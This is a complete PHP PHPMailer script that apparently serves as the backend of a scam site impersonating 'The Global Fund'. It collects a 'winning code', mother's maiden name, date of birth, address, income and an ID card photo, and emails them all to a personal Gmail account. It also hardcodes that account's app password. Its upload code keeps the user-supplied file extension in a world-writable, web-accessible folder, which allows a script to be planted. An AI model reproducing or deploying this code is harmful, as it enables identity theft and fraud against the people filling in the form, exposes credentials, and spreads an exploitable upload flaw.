<?php
// Include the PHPMailer autoloader
// IMPORTANT: Adjust this path if your 'vendor' directory is not in the same folder as submit_application.php
require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
// use PHPMailer\PHPMailer\SMTP; // Uncomment for debugging SMTP output

header('Content-Type: application/json');

// Ensure the request method is POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'message' => 'Invalid request method.']);
    exit;
}

// All form data (text fields) sent via FormData will be in $_POST
$data = $_POST;

// --- Handle File Upload (ID Card) ---
$idCardFilePath = ''; // Path where the uploaded file will be saved on the server
if (isset($_FILES['idCard']) && $_FILES['idCard']['error'] === UPLOAD_ERR_OK) {
    $uploadDir = 'uploads/'; // Directory to save uploaded files (make sure it exists and is writable)
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true); // Create directory if it doesn't exist. Be mindful of permissions.
    }

    // Generate a unique file name to prevent overwrites and security issues
    $fileExtension = pathinfo($_FILES['idCard']['name'], PATHINFO_EXTENSION);
    $idCardFileName = uniqid('id_card_') . '.' . $fileExtension;
    $idCardFilePath = $uploadDir . $idCardFileName;

    // Move the uploaded file from its temporary location to your designated directory
    if (!move_uploaded_file($_FILES['idCard']['tmp_name'], $idCardFilePath)) {
        echo json_encode(['success' => false, 'message' => 'Failed to upload ID card.']);
        exit;
    }
}

// --- Sanitize and Validate Input Data ---
// It's crucial to clean and validate ALL user input for security
$fullName = strip_tags($data['fullName'] ?? '');
$motherMaidenName = strip_tags($data['motherMaidenName'] ?? '');
$email = filter_var($data['email'] ?? '', FILTER_SANITIZE_EMAIL); // Keep FILTER_SANITIZE_EMAIL
$phone = strip_tags($data['phone'] ?? '');
$address = strip_tags($data['address'] ?? '');
$dateOfBirth = strip_tags($data['dateOfBirth'] ?? '');
$gender = strip_tags($data['gender'] ?? '');
$occupation = strip_tags($data['occupation'] ?? '');
$monthlyIncome = filter_var($data['monthlyIncome'] ?? '', FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION); // Keep this as is
$deliveryPreference = strip_tags($data['deliveryPreference'] ?? '');
$winningCode = strip_tags($data['winningCode'] ?? ''); // This is your line 87
$reason = strip_tags($data['reason'] ?? '');

// Basic validation: Check if required fields are not empty
if (empty($fullName) || empty($email) || empty($phone) || empty($address) || empty($reason)) {
    // If validation fails, clean up any uploaded file
    if ($idCardFilePath && file_exists($idCardFilePath)) {
        unlink($idCardFilePath);
    }
    echo json_encode(['success' => false, 'message' => 'Please fill in all required fields.']);
    exit;
}
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    if ($idCardFilePath && file_exists($idCardFilePath)) {
        unlink($idCardFilePath);
    }
    echo json_encode(['success' => false, 'message' => 'Invalid email format.']);
    exit;
}

// --- PHPMailer Email Sending Logic ---
$mail = new PHPMailer(true); // 'true' enables exceptions, useful for error handling

try {
    // Server settings for Gmail SMTP
    $mail->isSMTP();                                            // Use SMTP
    $mail->Host       = 'smtp.gmail.com';                       // Gmail SMTP server
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = 'ggf.agent.02488@gmail.com';         
    $mail->Password   = 'axno iqti woko dkni';              
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption
    $mail->Port       = 587;                                    // Port for TLS encryption

    // Optional: Enable verbose debug output. Remove or set to 0 in production.
   // $mail->SMTPDebug = \PHPMailer\PHPMailer\SMTP::DEBUG_SERVER; // Note the added '\PHPMailer' after the first '\'

    // Recipients
    $mail->setFrom('ggf.agent.02488@gmail.com', 'The Global Fund Grant Application'); // Sender (must be YOUR GMAIL address)
    $mail->addAddress('ggf.agent.02488@gmail.com', 'Grant Admin');     // <--- THE EMAIL ADDRESS WHERE YOU WANT TO RECEIVE SUBMISSIONS
    // You can add a reply-to address so you can easily reply to the applicant
    $mail->addReplyTo($email, $fullName);

    // Email Content
    $mail->isHTML(false); // Set email format to plain text (can be true for HTML emails)
    $mail->Subject = 'New The Global Fund  Application from ' . $fullName;

    $body = "A new grant application has been submitted:\n\n";
    $body .= "Full Name: " . $fullName . "\n";
    $body .= "Mother's Maiden Name: " . $motherMaidenName . "\n";
    $body .= "Email: " . $email . "\n";
    $body .= "Phone: " . $phone . "\n";
    $body .= "Address: " . $address . "\n";
    $body .= "Date of Birth: " . $dateOfBirth . "\n";
    $body .= "Gender: " . $gender . "\n";
    $body .= "Occupation: " . $occupation . "\n";
    $body .= "Monthly Income: " . $monthlyIncome . "\n";
    $body .= "Delivery Preference: " . $deliveryPreference . "\n";
    $body .= "Winning Code: " . $winningCode . "\n";
    $body .= "Reason for Applying:\n" . $reason . "\n\n";

    if ($idCardFilePath) {
        $body .= "ID Card Uploaded: A file named '" . $idCardFileName . "' was uploaded.\n";
        // Option 1: Provide a link to the uploaded file (requires 'uploads' folder to be web-accessible)
        $body .= "You can view it here: " . (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . '/' . $idCardFilePath . "\n";

        // Option 2 (Recommended for attachments): Attach the file directly to the email
        $mail->addAttachment($idCardFilePath, $_FILES['idCard']['name']); // Commented out for troubleshoot
    } else {
        $body .= "No ID Card was uploaded.\n";
    }

    $mail->Body = $body;

    $mail->send();
    echo json_encode(['success' => true, 'message' => 'Your application has been submitted successfully!']);

} catch (Exception $e) {
    // Log PHPMailer errors for debugging on your server
    error_log("PHPMailer Error: " . $mail->ErrorInfo);

    // If email sending fails, delete the uploaded file to avoid cluttering storage
    if ($idCardFilePath && file_exists($idCardFilePath)) {
        unlink($idCardFilePath);
    }
    echo json_encode(['success' => false, 'message' => 'Application submitted, but failed to send email. Please try again or contact support if the issue persists.']);
} finally {
    // If the file was attached to the email and you don't need to keep it on the server, delete it here
    // If you want to keep a record of all uploaded files, remove this `if` block.
    // We're simplifying the condition to avoid the 'Undefined property: $mailer' warning.
    // This will delete the uploaded file if it exists, regardless of the PHPMailer instance's exact state.
    if ($idCardFilePath && file_exists($idCardFilePath)) {
        unlink($idCardFilePath);
    }
}
?>